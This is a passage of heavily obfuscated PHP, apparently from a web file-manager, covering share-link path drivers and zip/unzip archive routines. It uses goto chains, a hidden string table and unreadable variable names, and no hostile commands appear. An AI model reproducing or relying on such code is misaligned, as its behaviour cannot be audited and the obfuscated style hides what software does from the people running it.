$‰¨ê³û° =& $_SERVER[—ÌÒğš÷]; $ÃÀ÷§‡­ = scandir($this->cachePath); foreach ($ÃÀ÷§‡­ as $úŸñ¼¶Œ) { $‘Ô§¶¿é = $this->cachePath . $úŸñ¼¶Œ; if (strpos($‘Ô§¶¿é, $‰¨ê³û°[875]) && strpos($‘Ô§¶¿é, $‰¨ê³û°[876]) && filemtime($‘Ô§¶¿é) < time()) { @unlink($‘Ô§¶¿é); } } } } $_file = $_SERVER[$_SERVER[—ÌÒğš÷][877]]; $_size = $_SERVER[—ÌÒğš÷][878]; goto EêˆãğÉêƒ; B¸«ª°ÆÆã: class PathDriverDbShareLink extends PathDriverDB { public function __construct($²ÒùÊÌ·) { $this->pathParse = $²ÒùÊÌ·; $this->model = Model($_SERVER[—ÌÒğš÷][1376]); } protected function infoParse($ñÏ²ÁÆ, $šâšïª´ = false, $í±Àõ = false) { $ïÖ†º×š =& $_SERVER[—ÌÒğš÷]; return Action($ïÖ†º×š[1218])->sharePathInfo($this->pathParse[$ïÖ†º×š[84]], !0, $šâšïª´); } public function listPath($½…û¸§Â, $äáë„› = false) { $¸Â ˜Â£ =& $_SERVER[—ÌÒğš÷]; $”Ñøªƒ´ = parent::listPath($½…û¸§Â, $äáë„›); if (!$”Ñøªƒ´) { return $”Ñøªƒ´; } if (is_array($”Ñøªƒ´[$¸Â ˜Â£[1384]])) { $”Ñøªƒ´[$¸Â ˜Â£[1384]] = Action($¸Â ˜Â£[1218])->shareItemInfo($”Ñøªƒ´[$¸Â ˜Â£[1384]]); } foreach ($”Ñøªƒ´ as $Ø‘—¥Ë— => $ªÁü¡) { if (!in_array($Ø‘—¥Ë—, array($¸Â ˜Â£[83], $¸Â ˜Â£[82]))) { continue; } foreach ($ªÁü¡ as $™ƒ›—ÂÈ => $àíôõ¬“) { $”Ñøªƒ´[$Ø‘—¥Ë—][$™ƒ›—ÂÈ] = Action($¸Â ˜Â£[1218])->shareItemInfo($àíôõ¬“); } } return $”Ñøªƒ´; } public function listAll($´éÌæÚº) { $Ø€»ÁÈ =& $_SERVER[—ÌÒğš÷]; $¥Ñ†Å´µ = IO::info($this->pathParse[$Ø€»ÁÈ[84]]); if (!$¥Ñ†Å´µ) { return array(); } $¨º³Ğ¼ = $this->model->listAll($´éÌæÚº); foreach ($¨º³Ğ¼ as &$§¤…ª†) { $§¤…ª†[$Ø€»ÁÈ[87]] = Action($Ø€»ÁÈ[1218])->shareItemInfo($§¤…ª†[$Ø€»ÁÈ[87]]); } unset($§¤…ª†); return $¨º³Ğ¼; } } class PathDriverDriverShareItem { public function __construct($ë…ûë) { $this->pathParse = $ë…ûë; } public function __call($¸Øš¦µÌ, $øıª¼¹“) { $¬¸¢ø‹¼ =& $_SERVER[—ÌÒğš÷]; if (method_exists($this, $¸Øš¦µÌ)) { return; } $–’² = call_user_func_array(array($¬¸¢ø‹¼[1385], $¸Øš¦µÌ), $øıª¼¹“); $‰œÇ«‹ì = array($¬¸¢ø‹¼[1386], $¬¸¢ø‹¼[1387], $¬¸¢ø‹¼[1388], $¬¸¢ø‹¼[1389], $¬¸¢ø‹¼[586], $¬¸¢ø‹¼[588], $¬¸¢ø‹¼[1390], $¬¸¢ø‹¼[107], $¬¸¢ø‹¼[1391], $¬¸¢ø‹¼[1392]); if (in_array($¸Øš¦µÌ, $‰œÇ«‹ì)) { $–’² = $this->getPathOuter($–’²); } return $–’²; } public function copy($âÅÓËÈ, $ğ˜åŠ„, $ŠÊ­»š = false, $¨ñšÓŒİ = false) { return $this->copyMove($âÅÓËÈ, $ğ˜åŠ„, $ŠÊ­»š, $_SERVER[—ÌÒğš÷][586], $¨ñšÓŒİ); } public function move($¬´ÅîÖº, $á­¶Õ„, $§•Æ’ö— = false, $­’×Â¼ = false) { return $this->copyMove($¬´ÅîÖº, $á­¶Õ„, $§•Æ’ö—, $_SERVER[—ÌÒğš÷][588], $­’×Â¼); } private function copyMove($÷È–…, $ß ğô‰, $ä¡¹Øòì, $‚•ç¡ÚĞ, $Ö‰ÉÆ— = false) { $Ÿèô²€ä =& $_SERVER[—ÌÒğš÷]; $ÀíîÁö´ = $ß ğô‰; $©Ñ´‚éÛ = IO::driverMake($ß ğô‰); if ($©Ñ´‚éÛ->pathParse[$Ÿèô²€ä[1195]]) { $ß ğô‰ = $©Ñ´‚éÛ->pathParse[$Ÿèô²€ä[1195]]; } else { $ß ğô‰ = $ÀíîÁö´; } $‰¨ŞáÖÁ = IO::copyMove($÷È–…, $ß ğô‰, $ä¡¹Øòì, $‚•ç¡ÚĞ, $Ö‰ÉÆ—); $‰¨ŞáÖÁ = $this->getPathOuter($‰¨ŞáÖÁ); return $‰¨ŞáÖÁ; } public function pathThis($Û¤Ÿ†³›) { return get_path_this($this->pathParse[$_SERVER[—ÌÒğš÷][84]]); } public function pathFather($—ŞÍ¼ü) { return get_path_father($this->pathParse[$_SERVER[—ÌÒğš÷][84]]); } public function iconvSystem($İ„³€‰ú) { return $İ„³€‰ú; } protected function infoParse($ˆŸñ¹Æè, $òàİ¨Çè = false) { $ö‰¾Ú™— =& $_SERVER[—ÌÒğš÷]; $²Ñ……½Ó = $this->pathParse[$ö‰¾Ú™—[528]][$ö‰¾Ú™—[1219]] . $this->pathParse[$ö‰¾Ú™—[1212]]; if ($òàİ¨Çè) { $ÓÙÓÄúƒ = IO::infoWithChildren($²Ñ……½Ó); } else { $ÓÙÓÄúƒ = IO::info($²Ñ……½Ó); } $“é«šğİ = $this->pathParse[$ö‰¾Ú™—[528]]; return Action($ö‰¾Ú™—[1383])->_shareItemeParse($ÓÙÓÄúƒ, $“é«šğİ); } public function listAll($ë¶Ä»°ğ) { $ûíàÑÚä =& $_SERVER[—ÌÒğš÷]; $ÕÜ—ê§ = IO::listAll($ë¶Ä»°ğ); $Ô‚’Ï = rtrim($this->pathParse[$ûíàÑÚä[528]][$ûíàÑÚä[1219]], $ûíàÑÚä[8]); foreach ($ÕÜ—ê§ as &$±ââîµ) { $±ââîµ[$ûíàÑÚä[84]] = $this->pathDriver . $ûíàÑÚä[8] . ltrim(substr($±ââîµ[$ûíàÑÚä[84]], strlen($Ô‚’Ï)), $ûíàÑÚä[8]); } unset($±ââîµ); return $ÕÜ—ê§; } public function listAllSimple($¼ı€¿ï, $á‰â¸§ = false) { $šÅ„‚¹İ =& $_SERVER[—ÌÒğš÷]; $ø–ª£ú  = $this->listAll($¼ı€¿ï); $Ïşš¼É = $this->pathParse[$šÅ„‚¹İ[463]]; if (trim($Ïşš¼É, $šÅ„‚¹İ[8]) == trim(get_path_father($Ïşš¼É), $šÅ„‚¹İ[8])) { $á‰â¸§ = !0; } return IO::init($šÅ„‚¹İ[12])->listAllSimpleMake($ø–ª£ú , $Ïşš¼É, $á‰â¸§); } public function getPathOuter($¦Ÿøúˆ¬) { $ë‰¨÷è =& $_SERVER[—ÌÒğš÷]; $’œàÙí¸ = KodIO::parse($¦Ÿøúˆ¬); if ($’œàÙí¸[$ë‰¨÷è[33]] == KodIO::KOD_SHARE_ITEM) { return $’œàÙí¸[$ë‰¨÷è[84]]; } $ÌÃÕ¨¿¬ = KodIO::clear($¦Ÿøúˆ¬); $Ø¦¤Éœ = KodIO::clear($this->pathParse[$ë‰¨÷è[528]][$ë‰¨÷è[1219]]); $ëğş¨æ™ = substr($ÌÃÕ¨¿¬, strlen($Ø¦¤Éœ)); if (substr($ÌÃÕ¨¿¬, 0, strlen($Ø¦¤Éœ)) != $Ø¦¤Éœ) { return !1; } return $this->pathParse[$ë‰¨÷è[1213]] . $ë‰¨÷è[8] . ltrim($ëğş¨æ™, $ë‰¨÷è[8]); } public function getType() { $²öµ¤•È =& $_SERVER[—ÌÒğš÷]; $³ ¡ìÛù = str_replace($²öµ¤•È[74], $²öµ¤•È[12], get_class($this)); return strtolower($³ ¡ìÛù); } public function isTypeObject($ËŸ”ÓŞí) { return IO::isTypeObject($ËŸ”ÓŞí); } public function info($åå·Éá¾) { return $this->infoParse($åå·Éá¾); } public function infoAuth($ÁØÈ§·¬) { return $this->infoParse($ÁØÈ§·¬); } public function infoWithChildren($Ìâ‰ç©) { return $this->infoParse($Ìâ‰ç©, !0); } public function infoFull($šµŒüö) { return $this->infoParse($šµŒüö); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ºüÚß…Œ) { $this->pathParse = $ºüÚß…Œ; } protected function infoParse($«‚°ŒÚ‹, $äíş¼æ² = false) { $æı¢Äˆá =& $_SERVER[—ÌÒğš÷]; return Action($æı¢Äˆá[1218])->sharePathInfo($this->pathParse[$æı¢Äˆá[84]], !0, $äíş¼æ²); } public function listPath($çÚÎéÎ‰, $‘²ğ„ = false) { $÷¡ªÇœ =& $_SERVER[—ÌÒğš÷]; $©ùşĞâ = IO::listPath($çÚÎéÎ‰, $‘²ğ„); if (!$©ùşĞâ) { return $©ùşĞâ; } if (is_array($©ùşĞâ[$÷¡ªÇœ[1384]])) { $ø¾öà§« = Action($÷¡ªÇœ[1393])->parsePathChildren($©ùşĞâ[$÷¡ªÇœ[1384]], array($÷¡ªÇœ[463] => $çÚÎéÎ‰)); $©ùşĞâ[$÷¡ªÇœ[1384]] = Action($÷¡ªÇœ[1218])->shareItemInfo($ø¾öà§«); } foreach ($©ùşĞâ as $õÚç–¾Å => $œ¿¦“¨Â) { if (!in_array($õÚç–¾Å, array($÷¡ªÇœ[83], $÷¡ªÇœ[82]))) { continue; } foreach ($œ¿¦“¨Â as $‰¿µ›Ó => $ø¾öà§«) { $ø¾öà§« = Action($÷¡ªÇœ[1393])->parsePathChildren($ø¾öà§«, array($÷¡ªÇœ[463] => $çÚÎéÎ‰)); $©ùşĞâ[$õÚç–¾Å][$‰¿µ›Ó] = Action($÷¡ªÇœ[1218])->shareItemInfo($ø¾öà§«); } } return $©ùşĞâ; } } goto bøÓ¿Ñ—µØ; b¸«ø³ªÜŸ: function binCheckBigger($ƒîË¡²·, $§˜†ğîË) { return $ƒîË¡²· > $§˜†ğîË; } $_SERVER[$_SERVER[­Ú¶×µ][3]] = ("\70\62\71\65"."\x37\x38")+0;$_60q2="fj397m4ovazl2xpwbcy0rqn86tsik5dhuge1w7584vm9z3iqre2sndjocyku0apg1bl6htfx0u6py52c";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ï»¶÷Ş, $ÊôàÃèâ) { $Êø¼æĞÏ =& $_SERVER[—ÌÒğš÷]; if (isset(self::$_methodList[$Ï»¶÷Ş])) { return @call_user_func_array(self::$_methodList[$Ï»¶÷Ş], $ÊôàÃèâ); } else { if (method_exists($this, $Ï»¶÷Ş)) { return call_user_func_array(array($this, $Ï»¶÷Ş), $ÊôàÃèâ); } else { think_exception(__CLASS__ . $Êø¼æĞÏ[4] . $Ï»¶÷Ş . $Êø¼æĞÏ[5]); } } } public static function __callStatic($·¸ü›Ñß, $ºÂ×Í) { if (isset(self::$_methodListStatic[$·¸ü›Ñß])) { return call_user_func_array(self::$_methodListStatic[$·¸ü›Ñß], $ºÂ×Í); } else { if (method_exists(self, $·¸ü›Ñß)) { return call_user_func_array(array(self, $·¸ü›Ñß), $ºÂ×Í); } else { show_json("{$·¸ü›Ñß}\x28\51\40\156\157\164\40\145\x78\x69\x73\164\x3b", !1); } } } public static function addMethod($úÚö«ƒä, $í–”øÕš) { self::$_methodList[$úÚö«ƒä] = $í–”øÕš; } public static function addMethodStatic($å”‹³ÑŸ, $ÑÃü´Ç) { self::$_methodListStatic[$å”‹³ÑŸ] = $ÑÃü´Ç; } } goto dò…ˆî¨õ¡; C•‰°øæ: define($_SERVER[—ÌÒğš÷][285], 1); define($_SERVER[—ÌÒğš÷][286], 0); define($_SERVER[—ÌÒğš÷][287], 2); goto AÔ°·äø¿‰; c¡¤´óÎÖÙ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¬¢Ùõç‹; if ($¬¢Ùõç‹) { return $¬¢Ùõç‹; } $‹Õƒ¿Ùø = IO::init($_SERVER[—ÌÒğš÷][8]); return $‹Õƒ¿Ùø; } private static function iconvSystem($¿¥˜„³ê) { return self::local()->iconvSystem($¿¥˜„³ê); } private static function iconvApp($‚œÒ”·İ) { return self::local()->iconvApp($‚œÒ”·İ); } public static function zipFolder($Šı•æµø, $¶Ëšœ† = "\x7a\151\160", $ÖöíÕÄ = '', $ŸÉŠºì¯ = REPEAT_RENAME) { $Ÿí’¡êÉ =& $_SERVER[—ÌÒğš÷]; $ãùàÅÚã = IO::listPath($Šı•æµø); if (!$ãùàÅÚã) { return !1; } $ãùàÅÚã = array_merge($ãùàÅÚã[$Ÿí’¡êÉ[82]], $ãùàÅÚã[$Ÿí’¡êÉ[83]]); return self::zip($ãùàÅÚã, $¶Ëšœ†, $ÖöíÕÄ, $ŸÉŠºì¯); } public static function zip($Ÿ…ªÁª, $÷¼íÈÃÄ = "\172\151\160", $Øß“ÆŸ« = '', $ëàÈëÔ» = REPEAT_RENAME) { $±Å•ÒÅ =& $_SERVER[—ÌÒğš÷]; if (is_string($Ÿ…ªÁª) && $Ÿ…ªÁª) { $Ÿ…ªÁª = array(array($±Å•ÒÅ[84] => $Ÿ…ªÁª)); } $€ĞÚ›şú = self::init($Ÿ…ªÁª[0][$±Å•ÒÅ[84]]); $õšÔš¢Û = self::info($Ÿ…ªÁª[0][$±Å•ÒÅ[84]]); $Ë—›Ñ³Ñ = $±Å•ÒÅ[12]; $™Á´©Î = $±Å•ÒÅ[12]; $Üé¢¡Ó = $±Å•ÒÅ[12]; if ($Øß“ÆŸ« && substr($Øß“ÆŸ«, -1, 1) != $±Å•ÒÅ[8]) { $™Á´©Î = get_path_father($Øß“ÆŸ«); $Üé¢¡Ó = get_path_this($Øß“ÆŸ«); } else { $™Á´©Î = self::pathFather($õšÔš¢Û[$±Å•ÒÅ[84]]); $Üé¢¡Ó = $õšÔš¢Û[$±Å•ÒÅ[32]] . $±Å•ÒÅ[10] . $÷¼íÈÃÄ; if (count($Ÿ…ªÁª) > 1) { $°éÂšà = IO::info($™Á´©Î); $Üé¢¡Ó = $°éÂšà[$±Å•ÒÅ[32]] . $±Å•ÒÅ[10] . $÷¼íÈÃÄ; } if ($Øß“ÆŸ«) { $™Á´©Î = $Øß“ÆŸ«; } } if ($€ĞÚ›şú->getType() == $±Å•ÒÅ[106]) { $’˜¨è¤ô = self::init($™Á´©Î); $ä¸ê’áÎ = $’˜¨è¤ô->getType() == $±Å•ÒÅ[106] ? $™Á´©Î : get_path_father($€ĞÚ›şú->path); $ä¸ê’áÎ = rtrim($ä¸ê’áÎ, $±Å•ÒÅ[8]) . $±Å•ÒÅ[8]; mk_dir($ä¸ê’áÎ); } else { $Ë—›Ñ³Ñ = TEMP_FILES . $±Å•ÒÅ[1227] . time() . rand_string(8) . $±Å•ÒÅ[8]; mk_dir($Ë—›Ñ³Ñ); file_put_contents($Ë—›Ñ³Ñ . $±Å•ÒÅ[1228], $±Å•ÒÅ[12]); $ä¸ê’áÎ = $Ë—›Ñ³Ñ; } $ÈÊ™–ò = IO::info($ä¸ê’áÎ); if (!$ÈÊ™–ò || !$ÈÊ™–ò[$±Å•ÒÅ[217]]) { show_json(LNG($±Å•ÒÅ[1229]), !1); } $óÀ¸ÀìÄ = self::zipFileList($Ÿ…ªÁª, $Ë—›Ñ³Ñ); foreach ($óÀ¸ÀìÄ as $Š˜ë¼„ => $ÈçÍàş¢) { $óÀ¸ÀìÄ[$Š˜ë¼„] = self::iconvSystem($ÈçÍàş¢); } $öÓ¦¡áå = get_filename_auto($ä¸ê’áÎ . $Üé¢¡Ó, $±Å•ÒÅ[12], $ëàÈëÔ»); KodArchive::create(self::iconvSystem($öÓ¦¡áå), $óÀ¸ÀìÄ); if (!IO::exist($öÓ¦¡áå)) { if ($Ë—›Ñ³Ñ) { del_dir($Ë—›Ñ³Ñ); } show_json(LNG($±Å•ÒÅ[1230]), !1); } if (!$Ë—›Ñ³Ñ) { return $öÓ¦¡áå; } $·î¥Û¿ = self::move($öÓ¦¡áå, $™Á´©Î, $ëàÈëÔ»); if ($Ë—›Ñ³Ñ) { del_dir($Ë—›Ñ³Ñ); } if (!$öÓ¦¡áå) { show_json(LNG($±Å•ÒÅ[1230]), !1); } return $·î¥Û¿; } public static function unzip($–¦Ğè¡, $×°ÍÏ´™, $æ·§±¡ß = "\55\x31", $¢¾ñêşæ = "\x72\x65\160\x6c\141\x63\x65") { $ïÓ§Ü…¢ =& $_SERVER[—ÌÒğš÷]; $Š“È¸Ø = parent::info($–¦Ğè¡); if (!$Š“È¸Ø) { show_json(LNG($ïÓ§Ü…¢[1231]), !1); } $É´Õ‘Ë = IO::infoFullSimple($×°ÍÏ´™); if (!$É´Õ‘Ë) { $×°ÍÏ´™ = IO::mkdir($×°ÍÏ´™); } if (isset($É´Õ‘Ë[$ïÓ§Ü…¢[181]]) && trim($É´Õ‘Ë[$ïÓ§Ü…¢[84]], $ïÓ§Ü…¢[8]) != trim($×°ÍÏ´™, $ïÓ§Ü…¢[8])) { $—Ã‡Å×ª = KodIO::make($É´Õ‘Ë[$ïÓ§Ü…¢[180]]); $İøâ¥Ñé = IO::fileNameAuto($—Ã‡Å×ª, $É´Õ‘Ë[$ïÓ§Ü…¢[32]], REPEAT_RENAME_FOLDER, !0); $×°ÍÏ´™ = IO::mkdir($—Ã‡Å×ª . $İøâ¥Ñé); } $æ·§±¡ß = $æ·§±¡ß && $æ·§±¡ß != $ïÓ§Ü…¢[1232] ? @json_decode($æ·§±¡ß, !0) : -1; $ ú´‘ü = self::unzipPart($–¦Ğè¡, $æ·§±¡ß); if (!$ ú´‘ü || !IO::exist($ ú´‘ü[$ïÓ§Ü…¢[214]])) { show_json(LNG($ïÓ§Ü…¢[105]), !1); } $ÂÉïúú = $ ú´‘ü[$ïÓ§Ü…¢[1233]][count($ ú´‘ü[$ïÓ§Ü…¢[1233]]) - 1]; if ($ÂÉïúú[$ïÓ§Ü…¢[1234]] == -1 || substr($ÂÉïúú[$ïÓ§Ü…¢[32]], -1, 1) == $ïÓ§Ü…¢[8]) { $áÓÑã”Û = $ ú´‘ü[$ïÓ§Ü…¢[1235]] . rand_string(10) . $ïÓ§Ü…¢[8]; mk_dir($áÓÑã”Û); $„šÌÜ§â = count($ ú´‘ü[$ïÓ§Ü…¢[1233]]) == 1 ? IO::ext($–¦Ğè¡) : get_path_ext($ ú´‘ü[$ïÓ§Ü…¢[214]]); $¨ËúÒâè = KodArchive::extract(self::iconvSystem($ ú´‘ü[$ïÓ§Ü…¢[214]]), $áÓÑã”Û, $ÂÉïúú[$ïÓ§Ü…¢[1234]], $İøâ¥Ñé, $„šÌÜ§â); self::unzipErrorCheck($¨ËúÒâè, array($ïÓ§Ü…¢[1236], $–¦Ğè¡, $„šÌÜ§â, $×°ÍÏ´™, $ ú´‘ü)); Hook::trigger($ïÓ§Ü…¢[1237], $áÓÑã”Û); recursion_dir($áÓÑã”Û, $À×óâØª, $œûè¶ùË, 0); $£ÅË¿Ãó = array_merge($À×óâØª, $œûè¶ùË); $¡ÂùÍ¸  = array(); foreach ($£ÅË¿Ãó as $Öê™Ñã¦) { $İ¿±€ì = IO::move(self::iconvApp($Öê™Ñã¦), $×°ÍÏ´™, $¢¾ñêşæ); if ($İ¿±€ì) { $¡ÂùÍ¸ [] = $İ¿±€ì; } } del_dir($áÓÑã”Û); } else { $İ¿±€ì = IO::move($ ú´‘ü[$ïÓ§Ü…¢[214]], $×°ÍÏ´™, $¢¾ñêşæ, get_path_this($ÂÉïúú[$ïÓ§Ü…¢[32]])); if ($İ¿±€ì) { $¡ÂùÍ¸ [] = $İ¿±€ì; } } return $¡ÂùÍ¸  ? $¡ÂùÍ¸  : !1; } public static function unzipList($ıÜ›ñ€Ã) { $Âïå§œ =& $_SERVER[—ÌÒğš÷]; $àô·²è = isset($ıÜ›ñ€Ã[$Âïå§œ[1238]]) ? $ıÜ›ñ€Ã[$Âïå§œ[1238]] : !1; $Ö×ŞçÙ³ = isset($ıÜ›ñ€Ã[$Âïå§œ[1234]]) ? @json_decode($ıÜ›ñ€Ã[$Âïå§œ[1234]], !0) : -1; $àã¢‘œ¢ = self::unzipPart($ıÜ›ñ€Ã[$Âïå§œ[84]], $Ö×ŞçÙ³); if (!$àã¢‘œ¢ || !IO::exist($àã¢‘œ¢[$Âïå§œ[214]])) { show_json(LNG($Âïå§œ[105]), !1); } $„Û±Ôıò = $àã¢‘œ¢[$Âïå§œ[1233]][count($àã¢‘œ¢[$Âïå§œ[1233]]) - 1]; $©‡ŞÚç = in_array(IO::ext($àã¢‘œ¢[$Âïå§œ[214]]), array($Âïå§œ[357], $Âïå§œ[1239], $Âïå§œ[1240], $Âïå§œ[1241], $Âïå§œ[1242], $Âïå§œ[1243])); if (!$àô·²è && ($„Û±Ôıò[$Âïå§œ[1234]] == -1 || $©‡ŞÚç)) { $ÎÀòÙƒæ = $àã¢‘œ¢[$Âïå§œ[1235]] . get_path_this($àã¢‘œ¢[$Âïå§œ[214]]) . $Âïå§œ[1244]; if (!IO::exist($ÎÀòÙƒæ)) { $³¥û° = $„Û±Ôıò[$Âïå§œ[1234]] == -1 ? get_path_ext(IO::pathThis($ıÜ›ñ€Ã[$Âïå§œ[84]])) : get_path_ext($àã¢‘œ¢[$Âïå§œ[214]]); $×–É¯ëÑ = KodArchive::listContent(self::iconvSystem($àã¢‘œ¢[$Âïå§œ[214]]), !0, $³¥û°); self::unzipErrorCheck($×–É¯ëÑ, array($Âïå§œ[1245], $ıÜ›ñ€Ã, $àã¢‘œ¢)); @file_put_contents($ÎÀòÙƒæ, json_encode($×–É¯ëÑ[$Âïå§œ[1246]])); } return @json_decode(IO::getContent($ÎÀòÙƒæ), !0); } IO::fileOut($àã¢‘œ¢[$Âïå§œ[214]], $àô·²è, get_path_this($„Û±Ôıò[$Âïå§œ[32]])); die; } private static function zipFileList($ÆÄ¥›’¦, $­Ç¨øÖô = false) { $û‰¶ÄŸš =& $_SERVER[—ÌÒğš÷]; $»ˆõ½€ø = array(); foreach ($ÆÄ¥›’¦ as $öÜ¸ì–ï) { $ÚÒÑìÏ¼ = $öÜ¸ì–ï[$û‰¶ÄŸš[84]]; if ($­Ç¨øÖô) { $ÚÒÑìÏ¼ = self::copy($öÜ¸ì–ï[$û‰¶ÄŸš[84]], $­Ç¨øÖô, $û‰¶ÄŸš[854]); } else { $©ŒÌ‡¯— = self::init($öÜ¸ì–ï[$û‰¶ÄŸš[84]]); if ($©ŒÌ‡¯—->getType() == $û‰¶ÄŸš[106]) { $ÚÒÑìÏ¼ = $©ŒÌ‡¯—->path; } } if ($ÚÒÑìÏ¼ && self::local()->exist($ÚÒÑìÏ¼)) { $»ˆõ½€ø[$öÜ¸ì–ï[$û‰¶ÄŸš[84]]] = $ÚÒÑìÏ¼; } } if (!empty($»ˆõ½€ø)) { return array_values($»ˆõ½€ø); } show_json(LNG($û‰¶ÄŸš[1209]), !1); } private static function localFilePath($•÷Î¡¹) { $ñíĞŸôğ =& $_SERVER[—ÌÒğš÷]; $‘ë»ö­’ = KodIO::parse($•÷Î¡¹); if ($‘ë»ö­’[$ñíĞŸôğ[33]] == KodIO::KOD_SOURCE) { $«æ¸ßöÁ = Model($ñíĞŸôğ[861])->fileInfoGet(KodIO::sourceID($•÷Î¡¹)); if (!$«æ¸ßöÁ[$ñíĞŸôğ[84]]) { show_json($ñíĞŸôğ[1247], !1); } $•÷Î¡¹ = $«æ¸ßöÁ[$ñíĞŸôğ[84]]; } $ìÑÙšîÚ = self::init($•÷Î¡¹); if ($ìÑÙšîÚ->pathParse[$ñíĞŸôğ[1195]]) { $•÷Î¡¹ = $ìÑÙšîÚ->pathParse[$ñíĞŸôğ[1195]]; $ìÑÙšîÚ = self::init($•÷Î¡¹); } $“àµûÕ÷ = $ìÑÙšîÚ->getType(); if ($“àµûÕ÷ == $ñíĞŸôğ[106] || $“àµûÕ÷ == $ñíĞŸôğ[1248]) { if (!$ìÑÙšîÚ->exist($ìÑÙšîÚ->path)) { show_json(LNG($ñíĞŸôğ[105]), !1); } return $ìÑÙšîÚ->path; } return !1; } public static function unzipPart($¸Äã˜…, $îùÀ™€í = -1) { $ÓÇÌ¿•Ö =& $_SERVER[—ÌÒğš÷]; $ÖÄ§õÅÅ = IO::pathThis($¸Äã˜…); if (!$îùÀ™€í || $îùÀ™€í == -1) { $±ù“õÆæ = array(array($ÓÇÌ¿•Ö[32] => $ÖÄ§õÅÅ, $ÓÇÌ¿•Ö[1234] => -1)); $±ù“õÆæ[0][$ÓÇÌ¿•Ö[1249]] = $±ù“õÆæ[0][$ÓÇÌ¿•Ö[32]]; } else { if (is_array($îùÀ™€í)) { $±ù“õÆæ = $îùÀ™€í; $Úá‰ÔÏß = count($±ù“õÆæ) - 1; for ($ç»ıÅà¥ = 0; $ç»ıÅà¥ <= $Úá‰ÔÏß; $ç»ıÅà¥++) { $˜™‘šˆÕ = $±ù“õÆæ[$ç»ıÅà¥]; $£¬§Éé’ = get_path_this($˜™‘šˆÕ[$ÓÇÌ¿•Ö[32]]) . (checkExtSafe($˜™‘šˆÕ[$ÓÇÌ¿•Ö[32]]) ? $ÓÇÌ¿•Ö[12] : $ÓÇÌ¿•Ö[1250]); $±ù“õÆæ[$ç»ıÅà¥][$ÓÇÌ¿•Ö[1249]] = $ÓÇÌ¿•Ö[1251] . intval($˜™‘šˆÕ[$ÓÇÌ¿•Ö[1234]]) . $ÓÇÌ¿•Ö[430] . $£¬§Éé’; if ($ç»ıÅà¥ == 0) { continue; } $±ù“õÆæ[$ç»ıÅà¥][$ÓÇÌ¿•Ö[1249]] = $±ù“õÆæ[$ç»ıÅà¥ - 1][$ÓÇÌ¿•Ö[1249]] . $ÓÇÌ¿•Ö[1252] . $±ù“õÆæ[$ç»ıÅà¥][$ÓÇÌ¿•Ö[1249]]; } } } if (!is_array($±ù“õÆæ) || count($±ù“õÆæ) == 0) { return !1; } $…¶Å…ó = $±ù“õÆæ[count($±ù“õÆæ) - 1]; if (!IO::exist($¸Äã˜…)) { return !1; } $ÙøØİšº = TEMP_FILES . $ÓÇÌ¿•Ö[1253] . kodIO::hashPathSafe($¸Äã˜…) . $ÓÇÌ¿•Ö[8]; $›Ş¿èõÙ = $ÙøØİšº . $…¶Å…ó[$ÓÇÌ¿•Ö[1249]]; mk_dir($ÙøØİšº); file_put_contents(TEMP_FILES . $ÓÇÌ¿•Ö[1228], $ÓÇÌ¿•Ö[12]); if (IO::exist($›Ş¿èõÙ)) { return array($ÓÇÌ¿•Ö[214] => $›Ş¿èõÙ, $ÓÇÌ¿•Ö[1233] => $±ù“õÆæ, $ÓÇÌ¿•Ö[1235] => $ÙøØİšº); } $åÈÆ–’È = self::localFilePath($¸Äã˜…); if (!$åÈÆ–’È) { $åÈÆ–’È = $ÙøØİšº . $ÓÇÌ¿•Ö[1254]; if (!IO::exist($åÈÆ–’È)) { self::copy($¸Äã˜…, $ÙøØİšº, !1, get_path_this($åÈÆ–’È)); } } if (!$åÈÆ–’È || !IO::exist($åÈÆ–’È)) { return !1; } if ($…¶Å…ó[$ÓÇÌ¿•Ö[1234]] == -1) { return array($ÓÇÌ¿•Ö[214] => $åÈÆ–’È, $ÓÇÌ¿•Ö[1233] => $±ù“õÆæ, $ÓÇÌ¿•Ö[1235] => $ÙøØİšº); } $Ä¤ƒ¬å = $åÈÆ–’È; foreach ($±ù“õÆæ as $ç»ıÅà¥ => $˜™‘šˆÕ) { if (!$˜™‘šˆÕ || $˜™‘šˆÕ[$ÓÇÌ¿•Ö[1234]] == $ÓÇÌ¿•Ö[1232]) { break; } if (substr($˜™‘šˆÕ[$ÓÇÌ¿•Ö[32]], -1, 1) == $ÓÇÌ¿•Ö[8]) { break; } $¬ëó€³õ = in_array(get_path_ext($˜™‘šˆÕ[$ÓÇÌ¿•Ö[1249]]), array($ÓÇÌ¿•Ö[357], $ÓÇÌ¿•Ö[1239], $ÓÇÌ¿•Ö[1240], $ÓÇÌ¿•Ö[1241], $ÓÇÌ¿•Ö[1242], $ÓÇÌ¿•Ö[1243])); $ íåŠ¶ï = $ç»ıÅà¥ == count($±ù“õÆæ) - 1 && $¬ëó€³õ; $Ù’Äçïı = $ÙøØİšº . $˜™‘šˆÕ[$ÓÇÌ¿•Ö[1249]]; $•ëÜ—Ë­ = $ÙøØİšº . get_path_this($˜™‘šˆÕ[$ÓÇÌ¿•Ö[32]]); if (IO::exist($Ù’Äçïı)) { $Ä¤ƒ¬å = $Ù’Äçïı; continue; } $Ó Ôì§¦ = $ç»ıÅà¥ == 0 ? get_path_ext($ÖÄ§õÅÅ) : get_path_ext($Ä¤ƒ¬å); $Á‚š¶Ù = KodArchive::extract(self::iconvSystem($Ä¤ƒ¬å), $ÙøØİšº, $˜™‘šˆÕ[$ÓÇÌ¿•Ö[1234]], $¡©Êöíî, $Ó Ôì§¦); self::unzipErrorCheck($Á‚š¶Ù, array($ÓÇÌ¿•Ö[1255], $¸Äã˜…, $±ù“õÆæ, $˜™‘šˆÕ, $Ù’Äçïı)); if (IO::exist($•ëÜ—Ë­)) { IO::rename($•ëÜ—Ë­, get_path_this($Ù’Äçïı)); } $Ä¤ƒ¬å = $Ù’Äçïı; } $›Ş¿èõÙ = $Ä¤ƒ¬å; return array($ÓÇÌ¿•Ö[214] => $Ä¤ƒ¬å, $ÓÇÌ¿•Ö[1233] => $±ù“õÆæ, $ÓÇÌ¿•Ö[1235] => $ÙøØİšº); } private static function unzipErrorCheck($áµØ¬¸ö, $ÔÈú‘§Ñ = false) { $ĞÉÎşú =& $_SERVER[—ÌÒğš÷]; if ($áµØ¬¸ö[$ĞÉÎşú[1256]]) { return !0; } write_log(array($ĞÉÎşú[1257], $áµØ¬¸ö, 